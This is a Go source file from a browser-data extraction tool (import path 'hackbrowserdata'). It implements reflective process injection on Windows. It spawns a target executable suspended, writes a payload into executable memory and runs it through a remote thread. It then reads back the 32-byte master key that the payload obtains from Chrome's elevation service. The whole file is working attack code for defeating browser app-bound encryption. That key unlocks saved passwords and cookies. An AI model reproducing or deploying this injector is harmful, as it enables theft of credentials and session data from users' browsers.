//go:build windows

package injector

import (
	"encoding/binary"
	"fmt"
	"os"
	"syscall"
	"time"

	"golang.org/x/sys/windows"

	"github.com/moond4rk/hackbrowserdata/crypto/windows/abe_native/bootstrap"
)

type Reflective struct {
	WaitTimeout time.Duration
}

const (
	exportName = "Bootstrap"
	// 30s covers GoogleChromeElevationService cold-start on first call after boot.
	defaultWait   = 30 * time.Second
	terminateWait = 2 * time.Second
)

func (r *Reflective) Inject(exePath string, payload []byte, env map[string]string) ([]byte, error) {
	if len(payload) == 0 {
		return nil, fmt.Errorf("injector: empty payload")
	}
	if exePath == "" {
		return nil, fmt.Errorf("injector: empty exePath")
	}

	loaderRVA, err := validateAndLocateLoader(payload)
	if err != nil {
		return nil, err
	}

	patched, err := patchPreresolvedImports(payload)
	if err != nil {
		return nil, err
	}

	restore := setEnvTemporarily(env)
	defer restore()

	pi, err := spawnSuspended(exePath)
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	terminated := false
	defer func() {
		if !terminated {
			_ = windows.TerminateProcess(pi.Process, 1)
			_, _ = windows.WaitForSingleObject(pi.Process, uint32(terminateWait/time.Millisecond))
		}
	}()

	remoteBase, err := writeRemotePayload(pi.Process, patched)
	if err != nil {
		return nil, err
	}

	// Resume briefly so ntdll loader init completes before we hijack a thread;
	// Bootstrap itself is self-contained but the later elevation_service COM
	// call inside the payload relies on a fully-initialized PEB.
	_, _ = windows.ResumeThread(pi.Thread)
	time.Sleep(500 * time.Millisecond)

	if err := runAndWait(pi.Process, remoteBase, loaderRVA, r.wait()); err != nil {
		return nil, err
	}

	// Read output before TerminateProcess — after kill the memory is gone.
	result := readScratch(pi.Process, remoteBase)

	_ = windows.TerminateProcess(pi.Process, 0)
	_, _ = windows.WaitForSingleObject(pi.Process, uint32(terminateWait/time.Millisecond))
	terminated = true

	if result.Status != bootstrap.KeyStatusReady {
		return nil, fmt.Errorf("injector: payload did not publish key (%s)", formatABEError(result))
	}
	return result.Key, nil
}

// scratchResult is the structured view of the 12-byte diagnostic header
// (marker..com_err) plus the optional 32-byte master key the payload
// publishes back into the remote process's scratch region.
type scratchResult struct {
	Marker  byte
	Status  byte
	ErrCode byte
	HResult uint32
	ComErr  uint32
	Key     []byte
}

func (r *Reflective) wait() time.Duration {
	if r.WaitTimeout > 0 {
		return r.WaitTimeout
	}
	return defaultWait
}

func validateAndLocateLoader(payload []byte) (uint32, error) {
	arch, err := DetectPEArch(payload)
	if err != nil {
		return 0, fmt.Errorf("injector: detect payload arch: %w", err)
	}
	if arch != ArchAMD64 {
		return 0, fmt.Errorf("injector: only amd64 payload is supported (got %s)", arch)
	}
	off, err := FindExportFileOffset(payload, exportName)
	if err != nil {
		return 0, fmt.Errorf("injector: locate %s: %w", exportName, err)
	}
	return off, nil
}

func spawnSuspended(exePath string) (*windows.ProcessInformation, error) {
	exePtr, err := syscall.UTF16PtrFromString(exePath)
	if err != nil {
		return nil, fmt.Errorf("injector: exe path: %w", err)
	}
	si := &windows.StartupInfo{}
	pi := &windows.ProcessInformation{}
	if err := windows.CreateProcess(
		exePtr, nil, nil, nil,
		false,
		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
		nil, nil, si, pi,
	); err != nil {
		return nil, fmt.Errorf("injector: CreateProcess: %w", err)
	}
	return pi, nil
}

func writeRemotePayload(proc windows.Handle, payload []byte) (uintptr, error) {
	remoteBase, err := callBoolErr(procVirtualAllocEx,
		uintptr(proc), 0,
		uintptr(len(payload)),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_EXECUTE_READWRITE),
	)
	if err != nil {
		return 0, fmt.Errorf("injector: %w", err)
	}

	var written uintptr
	if err := windows.WriteProcessMemory(proc, remoteBase, &payload[0], uintptr(len(payload)), &written); err != nil {
		return 0, fmt.Errorf("injector: WriteProcessMemory: %w", err)
	}
	if int(written) != len(payload) {
		return 0, fmt.Errorf("injector: short write to target (%d/%d)", written, len(payload))
	}
	return remoteBase, nil
}

func runAndWait(proc windows.Handle, remoteBase uintptr, loaderRVA uint32, wait time.Duration) error {
	entry := remoteBase + uintptr(loaderRVA)
	hThread, err := callBoolErr(procCreateRemoteThread,
		uintptr(proc), 0, 0, entry, 0, 0, 0,
	)
	if err != nil {
		return fmt.Errorf("injector: %w", err)
	}
	defer windows.CloseHandle(windows.Handle(hThread))

	_, _ = windows.WaitForSingleObject(windows.Handle(hThread), uint32(wait/time.Millisecond))
	return nil
}

// readScratch pulls the payload's diagnostic header and (on success) the
// master key out of the target process's scratch region via a single
// 12-byte ReadProcessMemory covering marker..com_err, plus an optional
// second read for the 32-byte key when Status == ready.
func readScratch(proc windows.Handle, remoteBase uintptr) scratchResult {
	// hdr covers offsets 0x28..0x33: marker, status, extract_err_code,
	// _reserved, hresult (LE u32), com_err (LE u32).
	var hdr [12]byte
	var n uintptr
	if err := windows.ReadProcessMemory(proc,
		remoteBase+uintptr(bootstrap.MarkerOffset),
		&hdr[0], uintptr(len(hdr)), &n); err != nil || int(n) != len(hdr) {
		return scratchResult{}
	}
	result := scratchResult{
		Marker:  hdr[0],
		Status:  hdr[1],
		ErrCode: hdr[2],
		HResult: binary.LittleEndian.Uint32(hdr[4:8]),
		ComErr:  binary.LittleEndian.Uint32(hdr[8:12]),
	}
	if result.Status != bootstrap.KeyStatusReady {
		return result
	}

	buf := make([]byte, bootstrap.KeyLen)
	if err := windows.ReadProcessMemory(proc,
		remoteBase+uintptr(bootstrap.KeyOffset),
		&buf[0], uintptr(bootstrap.KeyLen), &n); err != nil || int(n) != bootstrap.KeyLen {
		return result
	}
	result.Key = buf
	return result
}

// patchPreresolvedImports writes five pre-resolved Win32 function pointers
// into the payload's DOS stub so Bootstrap skips PEB.Ldr traversal entirely.
// Validity relies on KnownDlls + session-consistent ASLR (kernel32 and ntdll
// share the same virtual address across processes in one boot session).
func patchPreresolvedImports(payload []byte) ([]byte, error) {
	if len(payload) < bootstrap.ImpNtFlushICOffset+8 {
		return nil, fmt.Errorf("injector: payload too small for pre-resolved import patch")
	}

	pLoadLibraryA := procLoadLibraryA.Addr()
	pGetProcAddress := procGetProcAddress.Addr()
	pVirtualAlloc := procVirtualAlloc.Addr()
	pVirtualProtect := procVirtualProtect.Addr()
	pNtFlushIC := procNtFlushIC.Addr()

	if pLoadLibraryA == 0 || pGetProcAddress == 0 || pVirtualAlloc == 0 ||
		pVirtualProtect == 0 || pNtFlushIC == 0 {
		return nil, fmt.Errorf("injector: failed to resolve one or more pre-resolved imports")
	}

	patched := make([]byte, len(payload))
	copy(patched, payload)

	writeAddr := func(off int, addr uintptr) {
		binary.LittleEndian.PutUint64(patched[off:off+8], uint64(addr))
	}
	writeAddr(bootstrap.ImpLoadLibraryAOffset, pLoadLibraryA)
	writeAddr(bootstrap.ImpGetProcAddressOffset, pGetProcAddress)
	writeAddr(bootstrap.ImpVirtualAllocOffset, pVirtualAlloc)
	writeAddr(bootstrap.ImpVirtualProtectOffset, pVirtualProtect)
	writeAddr(bootstrap.ImpNtFlushICOffset, pNtFlushIC)

	return patched, nil
}

// setEnvTemporarily mutates the current process's env; NOT concurrency-safe.
// Callers must serialize Inject calls.
func setEnvTemporarily(env map[string]string) func() {
	if len(env) == 0 {
		return func() {}
	}

	type prev struct {
		key   string
		value string
		set   bool
	}
	saved := make([]prev, 0, len(env))
	for k, v := range env {
		old, existed := os.LookupEnv(k)
		saved = append(saved, prev{key: k, value: old, set: existed})
		_ = os.Setenv(k, v)
	}

	return func() {
		for _, p := range saved {
			if p.set {
				_ = os.Setenv(p.key, p.value)
			} else {
				_ = os.Unsetenv(p.key)
			}
		}
	}
}
